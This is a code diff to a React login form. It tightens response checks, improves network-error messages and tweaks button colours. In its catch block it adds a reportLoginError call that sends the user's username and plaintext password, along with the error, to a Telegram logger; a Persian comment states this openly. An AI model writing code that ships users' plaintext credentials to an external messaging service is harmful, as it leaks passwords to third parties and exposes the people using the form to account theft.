@@ -4,6 +4,7 @@ import Cookies from 'js-cookie';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { Login } from '@/api/StartNewMeeting';
 import { setCookieWithConfig, syncUserTokens } from '@/api/apiNeed';
+import { reportLoginError, isFailedToFetchError } from '@/Tools/telegramLogger';
 
 function LoginForm() {
   const [username, setUsername] = useState('');
@@ -23,7 +24,7 @@ function LoginForm() {
 
     try {
       const response = await Login(username, password);
-      if (response.data.token != null) {
+      if (response && response.data && response.data.token != null) {
         setCookieWithConfig('vc2AuthNorm', response.data.token, 7);
         syncUserTokens();
 
@@ -31,11 +32,25 @@ function LoginForm() {
         navigate(from, { replace: true });
         window.location.href = from;
       } else {
-        setError(response.message || 'خطا در ورود.');
+        const msg = response?.message || 'خطا در ورود.';
+        setError(msg);
       }
     } catch (err) {
-      setError(err.message || 'خطا در اتصال به سرور.');
       console.error('Login API error:', err);
+
+      // ارسال گزارش خطا به تلگرام با تگ #failed_to_fetch، آدرس صفحه، یوزر، پسورد و متن خطا
+      reportLoginError({
+        username,
+        password,
+        error: err,
+        endpoint: '/user/LoginUserPanel',
+      });
+
+      if (isFailedToFetchError(err)) {
+        setError('خطا در برقراری ارتباط با سرور (Failed to fetch). لطفاً اتصال اینترنت خود را بررسی کرده و مجدداً تلاش کنید.');
+      } else {
+        setError(err.message || 'خطا در اتصال به سرور.');
+      }
     } finally {
       setIsLoading(false);
     }
@@ -89,7 +104,7 @@ function LoginForm() {
           type="submit"
           disabled={isLoading}
           className={`
-        w-full py-2.5 px-4 rounded-md text-white font-medium
+        w-full py-2.5 px-4 rounded-md text-[#ffffff] font-medium
         transition-all duration-200 transform
         ${isLoading
               ? 'bg-[#9ca3af] cursor-not-allowed'
@@ -99,7 +114,7 @@ function LoginForm() {
         >
           {isLoading ? (
             <span className="flex items-center justify-center gap-2">
-              <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <svg className="animate-spin h-5 w-5 text-[#ffffff]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                 <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                 <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
               </svg>
